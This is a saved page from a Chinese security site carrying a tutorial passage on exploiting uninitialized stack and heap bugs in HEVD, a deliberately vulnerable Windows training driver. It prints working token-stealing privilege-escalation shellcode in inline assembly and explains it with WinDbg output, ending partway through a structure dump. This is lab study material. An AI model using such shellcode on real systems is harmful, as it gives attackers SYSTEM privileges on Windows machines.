<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】HEVD Kernel Exploitation--Uninitialized Stack & Heap - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="HEVD Kernel Exploitation,Uninitialized Stack,Heap"/>
    
        <meta name="description" content="HEVD是HackSys的一个Windows的训练项目，是一个存在漏洞的内核的驱动，里面存在多个漏洞，通过ControlCode控制漏洞类型，这个项目的驱动里几乎涵盖了内核可能存在的所有漏洞，从最基础的栈溢出，到池溢出，释放后重用等等类型，是一个非常好的项目。非常适合我们熟悉理解Windows内核漏洞的原理，利用技巧等等"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】HEVD Kernel Exploitation--Uninitialized Stack &amp; Heap</h2>
                <div class="article-msg">
                    <span class="time">2017-02-03 10:32:52</span>
                    
                                        <span class="read">阅读：18061次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3448"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3448" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html"
                             target="_blank">来源： whereisk0shl.top</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p6.qhimg.com/t019da7410e27a9b393.jpg" title="t01c20cd339a92d33af.jpg" alt="http://p1.qhimg.com/t01c20cd339a92d33af.jpg"/></span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x00前言</span></strong></span><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我是菜鸟，大牛们请喷T.T</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD是HackSys的一个Windows的训练项目，是一个存在漏洞的内核的驱动，里面存在多个漏洞，通过ControlCode控制漏洞类型，这个项目的驱动里几乎涵盖了内核可能存在的所有漏洞，从最基础的栈溢出，到池溢出，释放后重用等等类型，是一个非常好的项目。非常适合我们熟悉理解Windows内核漏洞的原理，利用技巧等等。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">项目地址：<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" _src="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">项目可以通过WDK的build方法直接编译，详细编译方法可以看《0day安全：软件漏洞分析技术》中内核漏洞章第一节内容有介绍，也可以百度直接搜到，通过build方法可以编译出对应版本的驱动.sys，然后通过osrloader工具注册并加载，之后就可以通过Demo来进行调试和提权了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这个项目中包含了两种漏洞类型，叫做Uninitialized Stack和Uninitialized Heap，分别是未初始化的栈和未初始化的堆，具体的漏洞形成原因可以通过阅读HEVD项目的源码和说明了解。大致漏洞形成的原因就是在驱动没有对结构体进行初始化，从而导致可以通过提前覆盖内核堆栈的方法控制关键结构体，在没有进行初始化和结构体内容检查的情况下，直接引用结构体的函数指针，最后可以通过提前覆盖的方法控制结构题的函数指针，跳转到提权shellcode，来完成提权。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这篇文章的内容不再分析漏洞成因，成因都非常简单，我将就几方面内容和大家一起分享一下学习成果，第一部分将分享一下HEVD项目中通用的提权shellcode，第二部分将跟大家分享一下j00ru提出的利用NtMapUserPhysicalPages进行kernel stack spray的方法，第三部分我将分享一下HEVD中的一个challenge，是关于未初始化堆空间利用的方法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HEVD项目中，不仅提供了包含漏洞的驱动源码，还包含了对应利用的Exploit，但是在Uninitialized Heap漏洞中提出了一个challenge。</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);"></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 0em; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);"><img src="http://p3.qhimg.com/t01b6c0579d1b55cff9.jpg" title="t01aeaf6a4aaf2e9965.jpg" alt="http://p1.qhimg.com/t01aeaf6a4aaf2e9965.jpg"/></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">下面我们一起来开始今天的学习之旅吧！</span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);"><br/></span></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><br/></p><p style="-webkit-print-color-adjust: exact; margin: 0px; padding: 0px; color: rgb(64, 64, 64); line-height: 36px; font-size: 18px; font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x01 privilege Escalation Shellcode</span></strong></p><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;"></span></p><hr/><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0);">关于提权的shellcode方法有很多，看过我之前对于CVE-2014-4113分析的小伙伴一定对替换token的这种方法比较熟悉，在我的那篇分析里，利用替换token这种shellcode是用C来实现的，当然，还有其他方法，比如将ACL置NULL这种方法，今天我还是给大家一起分享一下替换token这种方法，这种方法非常好用也非常常用，HEVD中替换shellcode的方法，是用内联汇编完成的。</span><br/></p><pre class="brush:bash;toolbar:false">VOID&nbsp;TokenStealingPayloadWin7Generic()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;No&nbsp;Need&nbsp;of&nbsp;Kernel&nbsp;Recovery&nbsp;as&nbsp;we&nbsp;are&nbsp;not&nbsp;corrupting&nbsp;anything
&nbsp;&nbsp;&nbsp;&nbsp;__asm&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Save&nbsp;registers&nbsp;state

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Start&nbsp;of&nbsp;Token&nbsp;Stealing&nbsp;Stub
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Set&nbsp;ZERO
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;fs:[eax&nbsp;+&nbsp;KTHREAD_OFFSET]&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;nt!_KPCR.PcrbData.CurrentThread
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;_KTHREAD&nbsp;is&nbsp;located&nbsp;at&nbsp;FS:[0x124]

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;EPROCESS_OFFSET]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;nt!_KTHREAD.ApcState.Process

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Copy&nbsp;current&nbsp;process&nbsp;_EPROCESS&nbsp;structure

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;SYSTEM_PID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;WIN&nbsp;7&nbsp;SP1&nbsp;SYSTEM&nbsp;process&nbsp;PID&nbsp;=&nbsp;0x4

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SearchSystemPID:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;FLINK_OFFSET]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;nt!_EPROCESS.ActiveProcessLinks.Flink
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;eax,&nbsp;FLINK_OFFSET
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;[eax&nbsp;+&nbsp;PID_OFFSET],&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;nt!_EPROCESS.UniqueProcessId
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;SearchSystemPID

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;[eax&nbsp;+&nbsp;TOKEN_OFFSET]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;SYSTEM&nbsp;process&nbsp;nt!_EPROCESS.Token
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[ecx&nbsp;+&nbsp;TOKEN_OFFSET],&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Replace&nbsp;target&nbsp;process&nbsp;nt!_EPROCESS.Token
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;with&nbsp;SYSTEM&nbsp;process&nbsp;nt!_EPROCESS.Token
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;End&nbsp;of&nbsp;Token&nbsp;Stealing&nbsp;Stub

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;popad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Restore&nbsp;registers&nbsp;state
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">这种方法，首先会通过fs段寄存器获取_KTHREAD结构题，fs段寄存器存放了关于线程的各种信息，当处于内核态时，fs的值为0x30，处于用户态时fs值则为0x3b。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;p
01352782&nbsp;57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
kd&gt;&nbsp;p
01352783&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushad
kd&gt;&nbsp;p
01352784&nbsp;33c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
kd&gt;&nbsp;p
01352786&nbsp;648b8024010000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;fs:[eax+124h]
kd&gt;&nbsp;dd&nbsp;0030:00000124
0030:00000124&nbsp;&nbsp;859615c0</pre><p style="-webkit-print-color-adjust: exact; margin-top: 0px; margin-bottom: 9px; padding: 0px; color: rgb(115, 115, 115); font-family: &#39;Helvetica Neue&#39;, Helvetica, &#39;Hiragino Sans GB&#39;, Arial, sans-serif; font-size: 13px; line-height: 18px; white-space: normal; text-indent: 2em;"><span style="line-height: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">随后获取到KTHREAD之后，我们可以获取到EPROCESS结构，这个结构中包含了PID等信息，最为关键的是，在内核中是以链表存放的，而这个链表就在_EPROCESS结构中。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;dd&nbsp;859615c0+50

85961610&nbsp;&nbsp;85a5e538&nbsp;09000000&nbsp;00000000&nbsp;00000000

85961620&nbsp;&nbsp;00000000&nbsp;00000037&nbsp;01000002&nbsp;00000000

85961630&nbsp;&nbsp;85961680&nbsp;82936088&nbsp;82936088&nbsp;00000000

85961640&nbsp;&nbsp;002e5ef3&nbsp;00000000&nbsp;7ffdd000&nbsp;00000000

85961650&nbsp;&nbsp;006a0008&nbsp;00000000&nbsp;859616c8&nbsp;859616c8

85961660&nbsp;&nbsp;6751178a&nbsp;0000006e&nbsp;00000000&nbsp;00000000

85961670&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000060&nbsp;82972b00

85961680&nbsp;&nbsp;859617fc&nbsp;859617fc&nbsp;859615c0&nbsp;843b0690

kd&gt;&nbsp;dt&nbsp;_EPROCESS&nbsp;85a5e538

ntdll!_EPROCESS

&nbsp;&nbsp;&nbsp;+0x000&nbsp;Pcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_KPROCESS

&nbsp;&nbsp;&nbsp;+0x098&nbsp;ProcessLock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_EX_PUSH_LOCK

&nbsp;&nbsp;&nbsp;+0x0a0&nbsp;CreateTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_LARGE_INTEGER&nbsp;0x1d27c2c`295b0eb9

&nbsp;&nbsp;&nbsp;+0x0a8&nbsp;ExitTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_LARGE_INTEGER&nbsp;0x0

&nbsp;&nbsp;&nbsp;+0x0b0&nbsp;RundownProtect&nbsp;&nbsp;&nbsp;:&nbsp;_EX_RUNDOWN_REF

&nbsp;&nbsp;&nbsp;+0x0b4&nbsp;UniqueProcessId&nbsp;&nbsp;:&nbsp;0x00000c64&nbsp;Void

